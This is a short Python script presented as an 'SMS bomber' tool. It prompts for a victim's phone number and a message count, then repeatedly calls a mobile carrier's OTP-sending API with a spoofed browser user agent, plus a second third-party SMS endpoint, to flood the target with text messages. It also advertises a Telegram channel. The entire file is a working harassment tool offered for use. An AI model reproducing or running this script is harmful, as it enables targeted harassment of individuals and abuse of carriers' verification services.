#coded by @x_spoilt
import os 
import requests
from concurrent.futures import ThreadPoolExecutor as bff 
import sys
send=0 
#----------------

def logo():
    x = """
          {
        
           "TOOL":"SMS BOMBER",
           "OWNER":"@peaky_xd"
           "VERSION":"1.0"
           "THREAD":"60" 
      
          }
    """
    print(x)
def linex():
    print("-"*40)
def main():
    os.system('clear')
    logo()
    linex()
    print("[A]> PEAKY BOMBER-[SPEED UP]")
    print("[B]> JOIN CHANNEL")
    x2 = input("[=]> SELECT : ")
    if x2.lower() == "a":
        x3 = input("[=]> ENTER NUMBER : ")
        x4 = input("[=]> ENTER LIMIT : ")
        linex()
        if x4.isdigit():
            with bff(max_workers=120) as minhutanhu:
                try:
                    minhutanhu.submit(boom, x3, x4)
                except Exception as e:
                    print(e)
        else:
            main() 
    elif x2.lower() == "b":
        os.system("xdg-open https://t.me/peaky_xd")
        main()
    else:
        main()
def boom(nmbr, lmt):
    global send, die, loop
    try:
        for i in range(int(lmt)):
            head1 = {
                'Host': 'da-api.robi.com.bd',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 9; i68 Build/P00610; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.144 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/387.0.0.13.114;]' 'python-requests/2.31.0',
                'Accept': 'application/json',
                'Connection': 'keep-alive',
                'Content-Type': 'application/json'
            }
            data1 = {'msisdn': nmbr}
            url1 = "https://da-api.robi.com.bd/da-nll/otp/send"
            url2 = f"https://api.teamdccs.xyz/sms.php?number={nmbr}"
            req1 = requests.post(url1, headers=head1, json=data1)
            req2 = requests.get(url2)
            if req1.status_code == 200:
                send += 1
                print(f"\r[API-1]> STATUS : [200]>[{send}]")
                linex()
            else:
                pass 
            if req2.status_code == 200:
                send += 1 
                print(f"\r[API-2]> STATUS : [200]>[{send}]")
                linex()
            else:
                 pass
    except Exception as e:
        print(e)

main()